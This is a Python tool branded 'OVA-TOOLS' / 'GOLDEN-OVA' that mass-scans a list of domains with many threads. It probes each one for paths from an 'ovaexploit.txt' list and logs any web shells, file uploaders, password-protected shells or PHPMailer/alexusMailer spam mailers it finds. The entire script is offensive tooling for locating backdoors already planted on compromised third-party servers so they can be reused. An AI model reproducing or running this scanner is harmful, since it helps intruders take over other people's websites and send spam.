import os
from typing import Text
import requests
import threading
from multiprocessing.dummy import Pool, Lock
import time
import string
import sys
import ctypes
from time import sleep
from random import choice, randint
from requests.api import head
from colorama import Fore, Style, init
import concurrent.futures
import re

init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

Bad = 0
Good = 0
pro = 0
Mailer = 0
Cp = 0
Send = 0
failed = 0
error = 0
Password = 0

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

Folder("OVA-Result")

def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass

def __init__():
    os.system("cls")
    banner = """
    [#] Create By ::
       ______      __       _______ ____   ____  _       _____ 
      / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
     | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
     | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
     | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
      \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                              OVA-TOOLS  https://t.me/ovacloud
                           [VIP] GOLDEN-OVA More Than 300+ Backdoors                        
                                                                
    """
    print(banner)
    os.system("cls")
    print(banner)


requests.urllib3.disable_warnings()

def URLdomain(site):
    if site.startswith("http://") or site.startswith("https://"):
        pass
    else:
        site = "http://" + site

    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    else:
        pass

    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site

def finde_it(domain):
    global Bad, Good, pro, Password, Mailer, error, Cp, Send, failed
    try:
        domain = domain.strip()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-us,en;q=0.5",
            "Accept-Encoding": "gzip,deflate",
            "Connection": "keep-alive",
            "Cookie": "PHPSESSID=OVA-TOOLS;",
            "Cache-Control": "no-cache"
        }
        for name in open('ovaexploit.txt', 'r', encoding="utf-8").readlines():
            name = name.strip()
            url = f"https://{domain}/{name}"
            to_domain = requests.get(
                f"https://{domain}/{name}", url, headers=headers, verify=False, timeout=30).text
 
            if 'No route found for "' not in str(to_domain) and 'Apache2' not in str(to_domain) and 'ErrorException' not in str(to_domain):
                if ">public_html" in to_domain:
                    open("OVA-Result/shell.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Good = Good + 1
                    print(f"[x] http://{domain}/{name} >> Shell")
                    break
                elif "<span>Upload file:" in to_domain:
                    open("OVA-Result/random.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Good = Good + 1
                    print(f"[x] http://{domain}/{name} >> Random Shell")
                    break
                elif 'type="submit" id="_upl" value="Upload">' in to_domain:
                    open("OVA-Result/Config.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Good = Good + 1
                    print(f"[x] http://{domain}/{name}  >> Config Shell")
                    break
                elif 'Leaf PHPMailer' in to_domain or '>alexusMailer 2.0<' in to_domain:
                    open("OVA-Result/Mailer.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Mailer = Mailer + 1
                    print(f"[x] http://{domain}/{name}  >> Mailer")
                    break
                elif 'method=post>Password:' in to_domain or '<input type=password name=pass' in to_domain:
                    open("OVA-Result/password.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Password = Password + 1
                    print(
                        f"[x] http://{domain}/{name}  >> Password Shell")
                    break
                elif 'name="uploader" id="uploader">' in to_domain:
                    open("OVA-Result/result.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Good = Good + 1
                    print(f"[x] http://{domain}/{name}  >> Uploader Script")
                    break
                elif "Upload File : <input" in to_domain:
                    open("OVA-Result/sw.txt", "a").write(
                        f"http://{domain}/{name}\n")
                    Good = Good + 1
                    print(f"[x] http://{domain}/{name}  >> Uploader Shell")
                    break
                else:
                    print(f"[x] http://{domain}/{name}  >> Not Found ")

                    Bad = Bad + 1
                    pass
    except:
        error = error + 1
        pass

def index():
    try:
        lists = sys.argv[1]
        numthread = sys.argv[2]
        readsplit = open(lists).read().splitlines()
    except:
        try:
            lists = input("List :")
            readsplit = open(lists, 'r', errors='ignore').read().splitlines()
        except:
            print("Wrong input or list not found!")
            exit()
        try:
            numthread = input("Threads :")
        except:
            print("Wrong thread number!")
            exit()
    try:
        with concurrent.futures.ThreadPoolExecutor(int(numthread)) as executor:
            executor.map(finde_it, readsplit)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    __init__()
    index()

def update_screen_title():
    global Good, Bad, Mailer, Password, error
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(
            '[VIP] GOLDEN-OVA |Shell- {} |Not-found- {} |Mailer- {}| Password-{}|Error-{}'.format(Good, Bad, Mailer, Password, error))
    else:
        sys.stdout.write('\x1b]2; [VIP] GOLDEN-OVA | By OVA-TOOLS |Shell- {} |Not Found- {}| Mailer-{}| Password-{}|Error-{}\x07'.format(
            Good, Bad, Mailer, Password, error))

update_screen_title()
